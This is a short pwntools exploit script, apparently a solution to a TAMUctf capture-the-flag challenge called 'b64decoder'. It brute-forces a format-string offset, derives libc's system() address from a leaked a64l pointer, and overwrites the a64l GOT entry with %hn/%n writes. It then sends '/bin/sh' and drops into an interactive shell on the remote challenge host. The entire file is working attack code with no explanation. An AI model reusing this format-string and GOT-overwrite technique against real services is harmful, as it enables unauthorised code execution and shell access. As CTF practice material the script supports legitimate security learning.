from pwn import *
p = remote("challenges.tamuctf.com", 2783)
binary = ELF("./b64decoder")
iso = ELF("./libc.so.6")
#a64l_got = 0x804b398
offset = 71

def offset_finder():
	for i in range(1,100):
		p = process("./b64decoder")
		print "I : ",i
		pay = ""
		pay += "AAAA"
		pay += "%{}$p".format(i)
		p.sendline(pay)
		p.recvuntil("Welcome, ")
		stack_value = p.recvline()[6:-1]
		if stack_value.find("141") != -1:
			print "offset found "
			print "value : {}".format(stack_value)
			break
		else:
			print " stack value : {}".format(stack_value)

		p.close()


def overwrite ():
	a64l_got = binary.got['a64l']
	print hex(a64l_got)
	p.recvuntil("Powered by a64l (")
	libc = p.recvline()[:-2]
	libc = int(libc,16)	
	print hex(libc)
	libc_base = libc - 0x0003f290
	libc_system = libc_base + 0x0003ec00
	print hex(libc_system)
	overwrite = str(hex(libc_system))[2:]
	first_overwrite = int(overwrite[4:],16)
	secont = int(overwrite[:4],16)
	pay = ""
	pay += p32(a64l_got)
	pay += p32(a64l_got+2)
	pay += "%71${}p".format(first_overwrite-len(pay))
	pay += "%71$hn"
	pay += "%{}p".format(secont-first_overwrite)
	pay += "%72$n"
	p.sendline(pay)
	#gdb.attach(p,"b* 0x080492f0")

	sleep(1)
	p.sendline("/bin/sh")
	p.interactive()

if __name__ == "__main__":
	overwrite()
